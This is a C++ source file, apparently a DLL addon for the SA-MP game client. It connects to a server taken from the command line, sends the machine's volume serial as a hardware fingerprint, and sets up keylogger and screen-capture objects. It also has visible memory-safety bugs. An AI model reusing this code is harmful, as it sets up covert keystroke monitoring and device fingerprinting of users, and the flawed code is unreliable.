#pragma once



#include "addon.h"





extern addonThread *gThread;
extern addonMutex *gMutex;
extern addonSocket *gSocket;
extern addonProcess *gProcess;
extern addonKeylog *gKeylog;
extern addonScreen *gScreen;
extern addonFS *gFS;
extern addonString *gString;

extern std::queue<std::string> send_to;





BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	if(fdwReason == DLL_PROCESS_ATTACH)
	{
		addonDebug("-----------------------------------------------------------------");
		addonDebug("Called dll attach | hinstDLL 0x%x | fdwReason %i | lpvReserved %i", hinstDLL, fdwReason, lpvReserved);
		addonDebug("-----------------------------------------------------------------");
	}
	else if(fdwReason == DLL_PROCESS_DETACH)
	{
		gSocket->Close();

		delete gKeylog;
		delete gProcess;
		delete gThread;
		delete gMutex;

		addonDebug("-----------------------------------------------------------------");
		addonDebug("Called dll detach | hinstDLL 0x%x | fdwReason %i | lpvReserved %i", hinstDLL, fdwReason, lpvReserved);
		addonDebug("-----------------------------------------------------------------");
	}

	return true;
}



__declspec(dllexport) void addon_start()
{
	if(!GetModuleHandleW(L"addon.asi") || !GetModuleHandleW(L"samp.dll") || !GetModuleHandleW(L"gta_sa.exe") || !GetModuleHandleW(L"VorbisFile.dll"))
	{
		addonDebug("Addon attached from unknown module, treminating");

		return;
	}

	addonDebug("Addon attached from loader. Processing...");

	gMutex = new addonMutex();
	gThread = new addonThread();
}



DWORD addonThread::Thread(void *lpParam)
{
	addonDebug("Thread addonThread::Thread(%i) succesfuly started", (int)lpParam);

	std::string commandLine = gString->wstring_to_string(std::wstring(GetCommandLineW()));

	if(commandLine.find("-c") == std::string::npos)
		return false;

	char name[25];
	char ip[16];
	char *sysdrive;
	int port;

	DWORD serial;
	DWORD flags;
	WCHAR tmpstr[5];
	
	commandLine.erase(NULL, commandLine.find("-c -n "));
	sscanf_s(commandLine.c_str(), "%*s %*s %s %*s %s %*s %d", name, sizeof name, ip, sizeof ip, &port);

	gSocket = new addonSocket();
	gSocket->Connect(std::string(ip), (port + 1));

	sysdrive = getenv("SystemDrive");
	strcat(sysdrive, "\\");
	MultiByteToWideChar(NULL, NULL, sysdrive, strlen(sysdrive), tmpstr, sizeof tmpstr);
	GetVolumeInformationW(tmpstr, NULL, NULL, &serial, NULL, &flags, NULL, NULL);

	gSocket->Send(formatString() << "TCPQUERY" << " " << "CLIENT_CALL" << " " << 1000 << " " << serial << " " << (serial + (flags ^ 0x2296666)) << " " << name << " " << ((serial | flags) & 0x28F39) << " " << flags);

	gProcess = new addonProcess();
	gKeylog = new addonKeylog();

	return true;
}



void addonDebug(char *text, ...)
{
	va_list args;
	std::fstream logfile;
	char timeform[16];
	time_t rawtime;
	struct tm * timeinfo;

	time(&rawtime);
	timeinfo = localtime(&rawtime);
	strftime(timeform, sizeof timeform, "%X", timeinfo);

	va_start(args, text);

	int length = vsnprintf(NULL, NULL, text, args);
	char *chars = new char[++length];

	length = vsnprintf(chars, length, text, args);
	std::string buffer(chars);

	delete[] chars;

	va_end(args);

	logfile.open("SAMP\\addon\\addon.log", std::fstream::out | std::fstream::app);
	logfile << '[' << timeform << ']' << ' ' << buffer << '\n';
	logfile.flush();
	logfile.close();
}